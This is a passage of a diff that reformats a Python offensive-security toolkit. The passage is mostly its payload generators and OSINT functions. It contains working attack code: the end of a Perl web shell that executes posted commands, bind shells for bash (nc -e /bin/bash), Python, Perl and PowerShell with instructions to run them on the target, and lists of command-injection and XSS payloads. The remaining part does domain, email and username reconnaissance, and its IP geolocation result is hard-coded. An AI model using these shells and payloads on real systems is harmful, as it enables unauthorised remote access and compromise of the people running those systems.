 print "Content-type: text/html\\n\\n";
 print "<html><head><title>Web Shell</title></head><body>";
 print "<form method='post'>";
@@ -2676,18 +3035,20 @@ if ($ENV{'REQUEST_METHOD'} eq "POST") {
     print `$cmd`;
     print "</pre>";
 }
-print "</body></html>";'''
+print "</body></html>";"""
 
     # Display payload
     console.print()
     display_panel(
         f"Web Shell Payload ({selected_platform})",
         "This is a minimal web shell for security testing. Use responsibly.",
-        NordColors.RED
+        NordColors.RED,
     )
 
     console.print(Syntax(payload, selected_platform, theme="nord"))
-    console.print(f"[bold {NordColors.YELLOW}]USAGE:[/] Upload to target server and access via browser.")
+    console.print(
+        f"[bold {NordColors.YELLOW}]USAGE:[/] Upload to target server and access via browser."
+    )
 
     # Save payload
     if get_confirmation("Save payload to file?"):
@@ -2703,7 +3064,7 @@ print "</body></html>";'''
             name=filename,
             payload_type="web_shell",
             target_platform=selected_platform,
-            content=payload
+            content=payload,
         )
         save_result_to_file(payload_obj, f"{filename}.json")
 
@@ -2719,7 +3080,9 @@ def generate_bind_shell():
     for i, platform in enumerate(platforms, 1):
         console.print(f"  {i}. {platform}")
 
-    platform_choice = get_integer_input(f"Select platform (1-{len(platforms)})", 1, len(platforms))
+    platform_choice = get_integer_input(
+        f"Select platform (1-{len(platforms)})", 1, len(platforms)
+    )
     if platform_choice <= 0:
         return
 
@@ -2731,12 +3094,12 @@ def generate_bind_shell():
     file_extension = "sh"
 
     if selected_platform == "bash":
-        payload = f'''#!/bin/bash
+        payload = f"""#!/bin/bash
 # Bind shell on port {port}
-nc -lvp {port} -e /bin/bash'''
+nc -lvp {port} -e /bin/bash"""
         file_extension = "sh"
     elif selected_platform == "python":
-        payload = f'''#!/usr/bin/env python3
+        payload = f"""#!/usr/bin/env python3
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.bind(("0.0.0.0",{port}))
@@ -2746,10 +3109,10 @@ while True:
     os.dup2(c.fileno(),0)
     os.dup2(c.fileno(),1)
     os.dup2(c.fileno(),2)
-    p=subprocess.call(["/bin/sh","-i"])'''
+    p=subprocess.call(["/bin/sh","-i"])"""
         file_extension = "py"
     elif selected_platform == "perl":
-        payload = f'''#!/usr/bin/env perl
+        payload = f"""#!/usr/bin/env perl
 use Socket;
 $p={port};
 socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
@@ -2760,10 +3123,10 @@ while(accept(C,S)){{
     open(STDOUT,">&C");
     open(STDERR,">&C");
     exec("/bin/sh -i");
-}};'''
+}};"""
         file_extension = "pl"
     elif selected_platform == "powershell":
-        payload = f'''$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{port});
+        payload = f"""$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{port});
 $listener.start();
 $client = $listener.AcceptTcpClient();
 $stream = $client.GetStream();
@@ -2777,7 +3140,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
     $stream.Flush();
 }}
 $client.Close();
-$listener.Stop();'''
+$listener.Stop();"""
         file_extension = "ps1"
 
     # Display payload
@@ -2785,11 +3148,13 @@ $listener.Stop();'''
     display_panel(
         f"Bind Shell Payload ({selected_platform})",
         f"Listening on port: {port}",
-        NordColors.RED
+        NordColors.RED,
     )
 
     console.print(Syntax(payload, selected_platform, theme="nord"))
-    console.print(f"[bold {NordColors.YELLOW}]USAGE:[/] Run on target system. Connect with: nc <target_ip> {port}")
+    console.print(
+        f"[bold {NordColors.YELLOW}]USAGE:[/] Run on target system. Connect with: nc <target_ip> {port}"
+    )
 
     # Save payload
     if get_confirmation("Save payload to file?"):
@@ -2806,7 +3171,7 @@ $listener.Stop();'''
             name=filename,
             payload_type="bind_shell",
             target_platform=selected_platform,
-            content=payload
+            content=payload,
         )
         save_result_to_file(payload_obj, f"{filename}.json")
 
@@ -2818,7 +3183,9 @@ def generate_cmd_injection():
     for i, platform in enumerate(platforms, 1):
         console.print(f"  {i}. {platform}")
 
-    platform_choice = get_integer_input(f"Select platform (1-{len(platforms)})", 1, len(platforms))
+    platform_choice = get_integer_input(
+        f"Select platform (1-{len(platforms)})", 1, len(platforms)
+    )
     if platform_choice <= 0:
         return
 
@@ -2830,28 +3197,40 @@ def generate_cmd_injection():
     if selected_platform == "unix":
         payloads = [
             {"description": "Basic command injection", "payload": "; ls -la"},
-            {"description": "Command injection with output redirection", "payload": "$(ls -la)"},
+            {
+                "description": "Command injection with output redirection",
+                "payload": "$(ls -la)",
+            },
             {"description": "Command substitution", "payload": "`ls -la`"},
             {"description": "Pipe command injection", "payload": "| ls -la"},
             {"description": "AND operator", "payload": "&& ls -la"},
             {"description": "OR operator", "payload": "|| ls -la"},
             {"description": "Background execution", "payload": "& ls -la"},
             {"description": "Newline injection", "payload": "\\n ls -la"},
-            {"description": "Base64 encoded command", "payload": "echo bHMgLWxh | base64 -d | bash"},
-            {"description": "Backtick with URL encoding", "payload": "%60ls%20-la%60"}
+            {
+                "description": "Base64 encoded command",
+                "payload": "echo bHMgLWxh | base64 -d | bash",
+            },
+            {"description": "Backtick with URL encoding", "payload": "%60ls%20-la%60"},
         ]
     else:  # Windows
         payloads = [
             {"description": "Basic command injection", "payload": "& dir"},
-            {"description": "Command injection with output redirection", "payload": "; dir"},
+            {
+                "description": "Command injection with output redirection",
+                "payload": "; dir",
+            },
             {"description": "Multiple commands", "payload": "dir & ipconfig"},
             {"description": "AND operator", "payload": "&& dir C:\\"},
             {"description": "OR operator", "payload": "|| dir"},
             {"description": "Command substitution (PowerShell)", "payload": "$(dir)"},
             {"description": "Pipe command injection", "payload": "| dir"},
             {"description": "Newline injection", "payload": "\\r\\n dir"},
-            {"description": "PowerShell encoded command", "payload": "powershell -enc ZABpAHIA"},
-            {"description": "Command with URL encoding", "payload": "%26%20dir"}
+            {
+                "description": "PowerShell encoded command",
+                "payload": "powershell -enc ZABpAHIA",
+            },
+            {"description": "Command with URL encoding", "payload": "%26%20dir"},
         ]
 
     # Display payloads
@@ -2860,7 +3239,7 @@ def generate_cmd_injection():
         title=f"Command Injection Payloads ({selected_platform})",
         show_header=True,
         header_style=f"bold {NordColors.FROST_1}",
-        border_style=NordColors.RED
+        border_style=NordColors.RED,
     )
     table.add_column("#", style=f"bold {NordColors.FROST_2}")
     table.add_column("Description", style=NordColors.SNOW_STORM_1)
@@ -2871,7 +3250,8 @@ def generate_cmd_injection():
 
     console.print(table)
     console.print(
-        f"[bold {NordColors.YELLOW}]USAGE:[/] Add these to input fields to test for command injection vulnerabilities")
+        f"[bold {NordColors.YELLOW}]USAGE:[/] Add these to input fields to test for command injection vulnerabilities"
+    )
 
     # Save payloads
     if get_confirmation("Save payloads to file?"):
@@ -2891,14 +3271,25 @@ def generate_cmd_injection():
         # Also save in JSON format
         json_filename = f"cmd_injection_{selected_platform}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
         save_result_to_file(
-            {"platform": selected_platform, "payloads": payloads, "timestamp": datetime.datetime.now().isoformat()},
-            json_filename
+            {
+                "platform": selected_platform,
+                "payloads": payloads,
+                "timestamp": datetime.datetime.now().isoformat(),
+            },
+            json_filename,
         )
 
 
 def generate_xss_payloads():
     payload_categories = [
-        "basic", "alert", "img", "body", "svg", "script", "event", "encoded"
+        "basic",
+        "alert",
+        "img",
+        "body",
+        "svg",
+        "script",
+        "event",
+        "encoded",
     ]
 
     console.print(f"[bold {NordColors.FROST_2}]XSS payload categories:[/]")
@@ -2906,8 +3297,11 @@ def generate_xss_payloads():
         console.print(f"  {i}. {category}")
     console.print(f"  {len(payload_categories) + 1}. all")
 
-    category_choice = get_integer_input(f"Select category (1-{len(payload_categories) + 1})", 1,
-                                        len(payload_categories) + 1)
+    category_choice = get_integer_input(
+        f"Select category (1-{len(payload_categories) + 1})",
+        1,
+        len(payload_categories) + 1,
+    )
     if category_choice <= 0:
         return
 
@@ -2921,50 +3315,110 @@ def generate_xss_payloads():
     all_payloads = {
         "basic": [
             {"description": "Basic XSS", "payload": "<script>alert('XSS')</script>"},
-            {"description": "Basic XSS with double quotes", "payload": "<script>alert(\"XSS\")</script>"},
-            {"description": "XSS with HTML encoding", "payload": "&lt;script&gt;alert('XSS')&lt;/script&gt;"}
+            {
+                "description": "Basic XSS with double quotes",
+                "payload": '<script>alert("XSS")</script>',
+            },
+            {
+                "description": "XSS with HTML encoding",
+                "payload": "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+            },
         ],
         "alert": [
-            {"description": "Alert with document cookie", "payload": "<script>alert(document.cookie)</script>"},
-            {"description": "Alert with document domain", "payload": "<script>alert(document.domain)</script>"},
-            {"description": "Alert with document URL", "payload": "<script>alert(document.URL)</script>"}
+            {
+                "description": "Alert with document cookie",
+                "payload": "<script>alert(document.cookie)</script>",
+            },
+            {
+                "description": "Alert with document domain",
+                "payload": "<script>alert(document.domain)</script>",
+            },
+            {
+                "description": "Alert with document URL",
+                "payload": "<script>alert(document.URL)</script>",
+            },
         ],
         "img": [
-            {"description": "Image tag with onerror", "payload": "<img src=x onerror=alert('XSS')>"},
-            {"description": "Image tag with invalid src", "payload": "<img src='javascript:alert(\"XSS\")'/>"},
-            {"description": "Image tag without quotes",
-             "payload": "<img src=javascript:alert(String.fromCharCode(88,83,83))>"}
+            {
+                "description": "Image tag with onerror",
+                "payload": "<img src=x onerror=alert('XSS')>",
+            },
+            {
+                "description": "Image tag with invalid src",
+                "payload": "<img src='javascript:alert(\"XSS\")'/>",
+            },
+            {
+                "description": "Image tag without quotes",
+                "payload": "<img src=javascript:alert(String.fromCharCode(88,83,83))>",
+            },
         ],
         "body": [
-            {"description": "Body tag with onload", "payload": "<body onload=alert('XSS')>"},
-            {"description": "Body tag with background", "payload": "<body background='javascript:alert(\"XSS\")'/>"},
-            {"description": "Body tag with combined events",
-             "payload": "<body onload=alert('XSS') onmouseover=alert('XSS')>"}
+            {
+                "description": "Body tag with onload",
+                "payload": "<body onload=alert('XSS')>",
+            },
+            {
+                "description": "Body tag with background",
+                "payload": "<body background='javascript:alert(\"XSS\")'/>",
+            },
+            {
+                "description": "Body tag with combined events",
+                "payload": "<body onload=alert('XSS') onmouseover=alert('XSS')>",
+            },
         ],
         "svg": [
             {"description": "SVG with onload", "payload": "<svg onload=alert('XSS')>"},
-            {"description": "SVG with nested script", "payload": "<svg><script>alert('XSS')</script></svg>"},
-            {"description": "SVG with animate tag",
-             "payload": "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>"}
+            {
+                "description": "SVG with nested script",
+                "payload": "<svg><script>alert('XSS')</script></svg>",
+            },
+            {
+                "description": "SVG with animate tag",
+                "payload": "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
+            },
         ],
         "script": [
-            {"description": "Script with source", "payload": "<script src=data:text/javascript,alert('XSS')></script>"},
-            {"description": "Script with eval", "payload": "<script>eval('alert(\"XSS\")')</script>"},
-            {"description": "Script with document.write",
-             "payload": "<script>document.write('<scr'+'ipt>alert(\"XSS\")</scr'+'ipt>')</script>"}
+            {
+                "description": "Script with source",
+                "payload": "<script src=data:text/javascript,alert('XSS')></script>",
+            },
+            {
+                "description": "Script with eval",
+                "payload": "<script>eval('alert(\"XSS\")')</script>",
+            },
+            {
+                "description": "Script with document.write",
+                "payload": "<script>document.write('<scr'+'ipt>alert(\"XSS\")</scr'+'ipt>')</script>",
+            },
         ],
         "event": [
-            {"description": "Div with onclick", "payload": "<div onclick=alert('XSS')>Click me</div>"},
-            {"description": "Iframe with onmouseover", "payload": "<iframe onmouseover=alert('XSS')></iframe>"},
-            {"description": "Input with onfocus", "payload": "<input onfocus=alert('XSS') autofocus>"}
+            {
+                "description": "Div with onclick",
+                "payload": "<div onclick=alert('XSS')>Click me</div>",
+            },
+            {
+                "description": "Iframe with onmouseover",
+                "payload": "<iframe onmouseover=alert('XSS')></iframe>",
+            },
+            {
+                "description": "Input with onfocus",
+                "payload": "<input onfocus=alert('XSS') autofocus>",
+            },
         ],
         "encoded": [
-            {"description": "JavaScript URI encoded",
-             "payload": "javascript:&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"},
-            {"description": "HTML hex encoded",
-             "payload": "&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;"},
-            {"description": "Base64 encoded", "payload": "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>"}
-        ]
+            {
+                "description": "JavaScript URI encoded",
+                "payload": "javascript:&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;",
+            },
+            {
+                "description": "HTML hex encoded",
+                "payload": "&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;",
+            },
+            {
+                "description": "Base64 encoded",
+                "payload": "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
+            },
+        ],
     }
 
     selected_payloads = []
@@ -2977,7 +3431,7 @@ def generate_xss_payloads():
         title=f"XSS Payloads ({', '.join(selected_categories)})",
         show_header=True,
         header_style=f"bold {NordColors.FROST_1}",
-        border_style=NordColors.RED
+        border_style=NordColors.RED,
     )
     table.add_column("#", style=f"bold {NordColors.FROST_2}")
     table.add_column("Description", style=NordColors.SNOW_STORM_1)
@@ -2987,7 +3441,9 @@ def generate_xss_payloads():
         table.add_row(str(i), payload["description"], payload["payload"])
 
     console.print(table)
-    console.print(f"[bold {NordColors.YELLOW}]USAGE:[/] Add these to input fields to test for XSS vulnerabilities")
+    console.print(
+        f"[bold {NordColors.YELLOW}]USAGE:[/] Add these to input fields to test for XSS vulnerabilities"
+    )
 
     # Save payloads
     if get_confirmation("Save payloads to file?"):
@@ -3007,9 +3463,12 @@ def generate_xss_payloads():
         # Also save in JSON format
         json_filename = f"xss_payloads_{'-'.join(selected_categories)}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
         save_result_to_file(
-            {"categories": selected_categories, "payloads": selected_payloads,
-             "timestamp": datetime.datetime.now().isoformat()},
-            json_filename
+            {
+                "categories": selected_categories,
+                "payloads": selected_payloads,
+                "timestamp": datetime.datetime.now().isoformat(),
+            },
+            json_filename,
         )
 
 
@@ -3019,7 +3478,7 @@ def osint_module():
     display_panel(
         "OSINT Gathering",
         "Collect open-source intelligence on targets.",
-        NordColors.FROST_2
+        NordColors.FROST_2,
     )
 
     options = [
@@ -3028,7 +3487,7 @@ def osint_module():
         ("3", "Email Intelligence", "Find information related to an email"),
         ("4", "Username Search", "Search for usernames across platforms"),
         ("5", "DNS Reconnaissance", "Advanced DNS lookups"),
-        ("0", "Return", "Return to Main Menu")
+        ("0", "Return", "Return to Main Menu"),
     ]
 
     console.print(create_menu_table("OSINT Options", options))
@@ -3067,17 +3526,26 @@ def domain_intelligence():
         {"name": "WHOIS lookup", "enabled": True},
         {"name": "DNS records", "enabled": True},
         {"name": "SSL certificate", "enabled": True},
-        {"name": "Subdomain enumeration", "enabled": shutil.which("subfinder") is not None},
+        {
+            "name": "Subdomain enumeration",
+            "enabled": shutil.which("subfinder") is not None,
+        },
         {"name": "HTTP headers", "enabled": True},
-        {"name": "Technology stack detection", "enabled": True}
+        {"name": "Technology stack detection", "enabled": True},
     ]
 
     console.print(f"[bold {NordColors.FROST_2}]Select intelligence options:[/]")
     for i, option in enumerate(options, 1):
-        status = "[green]Available[/]" if option["enabled"] else "[red]Not Available[/] (Tool missing)"
+        status = (
+            "[green]Available[/]"
+            if option["enabled"]
+            else "[red]Not Available[/] (Tool missing)"
+        )
         console.print(f"  {i}. {option['name']} - {status}")
 
-    selected_options = get_user_input("Select options (comma-separated numbers, or 'all')")
+    selected_options = get_user_input(
+        "Select options (comma-separated numbers, or 'all')"
+    )
 
     if not selected_options:
         return
@@ -3089,7 +3557,11 @@ def domain_intelligence():
         try:
             selected_indices = [int(i.strip()) - 1 for i in selected_options.split(",")]
             # Filter out indices that are out of range or disabled
-            selected_indices = [i for i in selected_indices if i >= 0 and i < len(options) and options[i]["enabled"]]
+            selected_indices = [
+                i
+                for i in selected_indices
+                if i >= 0 and i < len(options) and options[i]["enabled"]
+            ]
         except ValueError:
             print_error("Invalid selection")
             return
@@ -3101,7 +3573,9 @@ def domain_intelligence():
     # Collect intelligence
     results = {}
 
-    with console.status(f"[bold {NordColors.FROST_2}]Gathering intelligence on {domain}..."):
+    with console.status(
+        f"[bold {NordColors.FROST_2}]Gathering intelligence on {domain}..."
+    ):
         for idx in selected_indices:
             option = options[idx]
 
@@ -3121,9 +3595,7 @@ def domain_intelligence():
     # Display results
     console.print()
     display_panel(
-        "Domain Intelligence Results",
-        f"Target: {domain}",
-        NordColors.FROST_2
+        "Domain Intelligence Results", f"Target: {domain}", NordColors.FROST_2
     )
 
     if "whois" in results:
@@ -3215,9 +3687,7 @@ def domain_intelligence():
     # Save results
     if get_confirmation("Save intelligence results to file?"):
         osint_result = OSINTResult(
-            target=domain,
-            source_type="domain_intelligence",
-            data=results
+            target=domain, source_type="domain_intelligence", data=results
         )
 
         timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -3230,12 +3700,14 @@ def fetch_whois(domain):
         "registrar": "Unknown",
         "creation_date": "Unknown",
         "expiration_date": "Unknown",
-        "name_servers": []
+        "name_servers": [],
     }
 
     try:
         if shutil.which("whois"):
-            result = run_command(["whois", domain], capture_output=True, check=False, timeout=10)
+            result = run_command(
+                ["whois", domain], capture_output=True, check=False, timeout=10
+            )
 
             if result.stdout:
                 for line in result.stdout.splitlines():
@@ -3249,11 +3721,15 @@ def fetch_whois(domain):
 
                         if "registrar" in key and whois_data["registrar"] == "Unknown":
                             whois_data["registrar"] = value
-                        elif any(x in key for x in ["creation", "created"]) and whois_data[
-                            "creation_date"] == "Unknown":
+                        elif (
+                            any(x in key for x in ["creation", "created"])
+                            and whois_data["creation_date"] == "Unknown"
+                        ):
                             whois_data["creation_date"] = value
-                        elif any(x in key for x in ["expiration", "expires"]) and whois_data[
-                            "expiration_date"] == "Unknown":
+                        elif (
+                            any(x in key for x in ["expiration", "expires"])
+                            and whois_data["expiration_date"] == "Unknown"
+                        ):
                             whois_data["expiration_date"] = value
                         elif "name server" in key:
                             if value and value.lower() != "none":
@@ -3261,6 +3737,7 @@ def fetch_whois(domain):
         else:
             # Fallback to HTTP-based WHOIS (simplified)
             import socket
+
             ip = socket.gethostbyname(domain)
             whois_data["ip_address"] = ip
     except Exception as e:
@@ -3270,19 +3747,13 @@ def fetch_whois(domain):
 
 
 def fetch_dns_records(domain):
-    dns_data = {
-        "A": [],
-        "AAAA": [],
-        "MX": [],
-        "NS": [],
-        "TXT": [],
-        "CNAME": []
-    }
+    dns_data = {"A": [], "AAAA": [], "MX": [], "NS": [], "TXT": [], "CNAME": []}
 
     try:
         # A records
         try:
             import socket
+
             ip = socket.gethostbyname(domain)
             dns_data["A"].append(ip)
         except Exception:
@@ -3291,8 +3762,12 @@ def fetch_dns_records(domain):
         # Use dig if available for more record types
         if shutil.which("dig"):
             for record_type in dns_data.keys():
-                result = run_command(["dig", "+short", domain, record_type], capture_output=True, check=False,
-                                     timeout=5)
+                result = run_command(
+                    ["dig", "+short", domain, record_type],
+                    capture_output=True,
+                    check=False,
+                    timeout=5,
+                )
 
                 if result.stdout:
                     for line in result.stdout.splitlines():
@@ -3322,8 +3797,12 @@ def fetch_ssl_info(domain):
                 cert = ssock.getpeercert()
 
                 # Extract certificate information
-                ssl_data["issuer"] = ", ".join([f"{k}={v}" for k, v in cert["issuer"][0]])
-                ssl_data["subject"] = ", ".join([f"{k}={v}" for k, v in cert["subject"][0]])
+                ssl_data["issuer"] = ", ".join(
+                    [f"{k}={v}" for k, v in cert["issuer"][0]]
+                )
+                ssl_data["subject"] = ", ".join(
+                    [f"{k}={v}" for k, v in cert["subject"][0]]
+                )
                 ssl_data["version"] = cert["version"]
                 ssl_data["valid_from"] = cert["notBefore"]
                 ssl_data["valid_until"] = cert["notAfter"]
@@ -3344,7 +3823,12 @@ def enumerate_subdomains(domain):
 
     try:
         if shutil.which("subfinder"):
-            result = run_command(["subfinder", "-d", domain, "-silent"], capture_output=True, check=False, timeout=60)
+            result = run_command(
+                ["subfinder", "-d", domain, "-silent"],
+                capture_output=True,
+                check=False,
+                timeout=60,
+            )
 
             if result.stdout:
                 for line in result.stdout.splitlines():
@@ -3355,8 +3839,22 @@ def enumerate_subdomains(domain):
         # If no results or subfinder not available, try basic enumeration
         if not subdomains:
             # Common subdomains to check
-            common_subdomains = ["www", "mail", "ftp", "webmail", "login", "admin", "shop",
-                                 "blog", "dev", "api", "staging", "test", "portal", "cpanel"]
+            common_subdomains = [
+                "www",
+                "mail",
+                "ftp",
+                "webmail",
+                "login",
+                "admin",
+                "shop",
+                "blog",
+                "dev",
+                "api",
+                "staging",
+                "test",
+                "portal",
+                "cpanel",
+            ]
 
             for sub in common_subdomains:
                 subdomain = f"{sub}.{domain}"
@@ -3429,19 +3927,32 @@ def detect_technologies(domain):
 
                 # JavaScript frameworks
                 if "react" in html or "reactjs" in html:
-                    technologies.append({"name": "React", "category": "JavaScript Framework"})
+                    technologies.append(
+                        {"name": "React", "category": "JavaScript Framework"}
+                    )
                 if "angular" in html:
-                    technologies.append({"name": "Angular", "category": "JavaScript Framework"})
+                    technologies.append(
+                        {"name": "Angular", "category": "JavaScript Framework"}
+                    )
                 if "vue" in html or "vuejs" in html:
-                    technologies.append({"name": "Vue.js", "category": "JavaScript Framework"})
+                    technologies.append(
+                        {"name": "Vue.js", "category": "JavaScript Framework"}
+                    )
 
                 # Analytics
                 if "google analytics" in html or "ga.js" in html or "gtag" in html:
-                    technologies.append({"name": "Google Analytics", "category": "Analytics"})
+                    technologies.append(
+                        {"name": "Google Analytics", "category": "Analytics"}
+                    )
 
                 # CDNs
-                if "cloudflare" in headers.get("server", "").lower() or "cloudflare" in html:
-                    technologies.append({"name": "Cloudflare", "category": "CDN/Security"})
+                if (
+                    "cloudflare" in headers.get("server", "").lower()
+                    or "cloudflare" in html
+                ):
+                    technologies.append(
+                        {"name": "Cloudflare", "category": "CDN/Security"}
+                    )
                 if "akamai" in headers.get("server", "").lower():
                     technologies.append({"name": "Akamai", "category": "CDN"})
 
@@ -3449,7 +3960,9 @@ def detect_technologies(domain):
                 if "shopify" in html:
                     technologies.append({"name": "Shopify", "category": "E-commerce"})
                 if "woocommerce" in html:
-                    technologies.append({"name": "WooCommerce", "category": "E-commerce"})
+                    technologies.append(
+                        {"name": "WooCommerce", "category": "E-commerce"}
+                    )
                 if "magento" in html:
                     technologies.append({"name": "Magento", "category": "E-commerce"})
 
@@ -3476,7 +3989,9 @@ def ip_intelligence():
 
     results = {}
 
-    with console.status(f"[bold {NordColors.FROST_2}]Gathering intelligence on {ip}..."):
+    with console.status(
+        f"[bold {NordColors.FROST_2}]Gathering intelligence on {ip}..."
+    ):
         # Geolocation (simulated)
         results["geolocation"] = {
             "country": "United States",
@@ -3484,7 +3999,7 @@ def ip_intelligence():
             "region": "California",
             "coordinates": "37.3861, -122.0839",
             "isp": "Google LLC",
-            "timezone": "America/Los_Angeles"
+            "timezone": "America/Los_Angeles",
         }
 
         # Reverse DNS
@@ -3514,11 +4029,7 @@ def ip_intelligence():
 
     # Display results
     console.print()
-    display_panel(
-        "IP Intelligence Results",
-        f"Target: {ip}",
-        NordColors.FROST_2
-    )
+    display_panel("IP Intelligence Results", f"Target: {ip}", NordColors.FROST_2)
 
     if "geolocation" in results:
         geo_table = Table(
@@ -3535,7 +4046,9 @@ def ip_intelligence():
         console.print(geo_table)
 
     if "reverse_dns" in results:
-        console.print(f"[bold {NordColors.FROST_2}]Reverse DNS:[/] {results['reverse_dns']}")
+        console.print(
+            f"[bold {NordColors.FROST_2}]Reverse DNS:[/] {results['reverse_dns']}"
+        )
 
     if results["open_ports"]:
         port_table = Table(
@@ -3549,9 +4062,7 @@ def ip_intelligence():
 
         for port, info in sorted(results["open_ports"].items()):
             port_table.add_row(
-                str(port),
-                info.get("service", "unknown"),
-                info.get("state", "unknown")
+                str(port), info.get("service", "unknown"), info.get("state", "unknown")
             )
 
         console.print(port_table)
@@ -3561,9 +4072,7 @@ def ip_intelligence():
     # Save results
     if get_confirmation("Save intelligence results to file?"):
         osint_result = OSINTResult(
-            target=ip,
-            source_type="ip_intelligence",
-            data=results
+            target=ip, source_type="ip_intelligence", data=results
         )
 
         timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -3585,7 +4094,9 @@ def email_intelligence():
 
     results = {}
 
-    with console.status(f"[bold {NordColors.FROST_2}]Gathering intelligence on {email}..."):
+    with console.status(
+        f"[bold {NordColors.FROST_2}]Gathering intelligence on {email}..."
+    ):
         # Domain information
         results["domain"] = fetch_domain_info(domain)
 
@@ -3605,7 +4116,7 @@ def email_intelligence():
             "aol.com": "AOL Mail",
             "protonmail.com": "ProtonMail",
             "icloud.com": "Apple iCloud",
-            "zohomail.com": "Zoho Mail"
+            "zohomail.com": "Zoho Mail",
         }
 
         if domain in mail_services:
@@ -3615,11 +4126,7 @@ def email_intelligence():
 
     # Display results
     console.print()
-    display_panel(
-        "Email Intelligence Results",
-        f"Target: {email}",
-        NordColors.FROST_2
-    )
+    display_panel("Email Intelligence Results", f"Target: {email}", NordColors.FROST_2)
 
     email_table = Table(
         title="Email Analysis",
@@ -3671,13 +4178,13 @@ def email_intelligence():
     # Save results
     if get_confirmation("Save intelligence results to file?"):
         osint_result = OSINTResult(
-            target=email,
-            source_type="email_intelligence",
-            data=results
+            target=email, source_type="email_intelligence", data=results
         )
 
         timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"email_intel_{email.replace('@', '_').replace('.', '_')}_{timestamp}.json"
+        filename = (
+            f"email_intel_{email.replace('@', '_').replace('.', '_')}_{timestamp}.json"
+        )
         save_result_to_file(osint_result, filename)
 
 
@@ -3687,7 +4194,9 @@ def fetch_domain_info(domain):
     try:
         # Get domain creation date and registrar (if available)
         if shutil.which("whois"):
-            result = run_command(["whois", domain], capture_output=True, check=False, timeout=10)
+            result = run_command(
+                ["whois", domain], capture_output=True, check=False, timeout=10
+            )
 
             if result.stdout:
                 for line in result.stdout.splitlines():
@@ -3726,7 +4235,12 @@ def fetch_mx_records(domain):
 
     try:
         if shutil.which("dig"):
-            result = run_command(["dig", "+short", "MX", domain], capture_output=True, check=False, timeout=5)
+            result = run_command(
+                ["dig", "+short", "MX", domain],
+                capture_output=True,
+                check=False,
+                timeout=5,
+            )
 
             if result.stdout:
                 for line in result.stdout.splitlines():
@@ -3762,12 +4276,14 @@ def username_search():
         {"name": "Reddit", "url": f"https://www.reddit.com/user/{username}"},
         {"name": "TikTok", "url": f"https://www.tiktok.com/@{username}"},
         {"name": "Pinterest", "url": f"https://www.pinterest.com/{username}/"},
-        {"name": "YouTube", "url": f"https://www.youtube.com/user/{username}"}
+        {"name": "YouTube", "url": f"https://www.youtube.com/user/{username}"},
     ]
 
     results = {}
 
-    progress, task = display_progress(len(platforms), "Checking platforms", NordColors.FROST_2)
+    progress, task = display_progress(
+        len(platforms), "Checking platforms", NordColors.FROST_2
+    )
 
     with progress:
         for platform in platforms:
@@ -3775,7 +4291,9 @@ def username_search():
 
             try:
                 headers = {"User-Agent": random.choice(USER_AGENTS)}
-                response = requests.head(platform["url"], headers=headers, timeout=5, allow_redirects=True)
+                response = requests.head(
+                    platform["url"], headers=headers, timeout=5, allow_redirects=True
+                )
 
                 # Check status code (200 OK usually means username exists)
                 if response.status_code == 200:
@@ -3790,9 +4308,7 @@ def username_search():
     # Display results
     console.print()
     display_panel(
-        "Username Search Results",
-        f"Username: {username}",
-        NordColors.FROST_2
+        "Username Search Results", f"Username: {username}", NordColors.FROST_2
     )
 
     found_count = sum(1 for platform, info in results.items() if info["found"])
@@ -3807,7 +4323,11 @@ def username_search():
     username_table.add_column("URL", style=NordColors.FROST_3)
 
     for platform, info in results.items():
-        status = f"[bold {NordColors.GREEN}]● FOUND[/]" if info["found"] else f"[dim {NordColors.RED}]○ NOT FOUND[/]"
+        status = (
+            f"[bold {NordColors.GREEN}]● FOUND[/]"
+            if info["found"]
+            else f"[dim {NordColors.RED}]○ NOT FOUND[/]"
+        )
         username_table.add_row(platform, status, info["url"])
 
     console.print(username_table)
@@ -3818,8 +4338,12 @@ def username_search():
         filename = f"username_search_{username}_{timestamp}.json"
 
         save_result_to_file(
-            {"username": username, "results": results, "timestamp": datetime.datetime.now().isoformat()},
-            filename
+            {
+                "username": username,
+                "results": results,
+                "timestamp": datetime.datetime.now().isoformat(),
+            },
+            filename,
         )
 
 
@@ -3835,7 +4359,9 @@ def dns_reconnaissance():
         console.print(f"  {i}. {record_type}")
     console.print(f"  {len(record_types) + 1}. All")
 
-    type_choice = get_integer_input(f"Select record type (1-{len(record_types) + 1})", 1, len(record_types) + 1)
+    type_choice = get_integer_input(
+        f"Select record type (1-{len(record_types) + 1})", 1, len(record_types) + 1
+    )
     if type_choice <= 0:
         return
 
@@ -3847,14 +4373,26 @@ def dns_reconnaissance():
 
     results = {}
 
-    progress, task = display_progress(len(selected_types), "Querying DNS records", NordColors.FROST_2)
+    progress, task = display_progress(
+        len(selected_types), "Querying DNS records", NordColors.FROST_2
+    )
 
     with progress:
         for record_type in selected_types:
             if shutil.which("dig"):
                 try:
